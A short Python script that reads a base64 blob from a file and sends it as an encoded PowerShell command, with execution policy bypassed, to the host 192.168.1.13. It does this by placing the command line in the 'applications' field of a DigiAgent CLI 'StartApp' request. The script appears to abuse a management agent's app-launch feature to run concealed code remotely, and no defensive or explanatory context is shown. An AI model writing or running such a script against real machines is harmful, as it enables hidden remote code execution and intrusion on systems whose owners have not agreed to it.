import subprocess
import json

with open(r'C:\SynapseAISentinel\encoded_report.txt', 'r') as f:
    b64 = f.read().strip()

cmd = f"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {b64}"
payload = json.dumps({"applications": cmd})

res = subprocess.run([
    r"C:\Program Files\DigiAgent\digiagent-cli.exe",
    "feature", "start", "192.168.1.13", "StartApp", payload
], capture_output=True, text=True)

print("Returncode:", res.returncode)
print("Stdout:", res.stdout)
print("Stderr:", res.stderr)
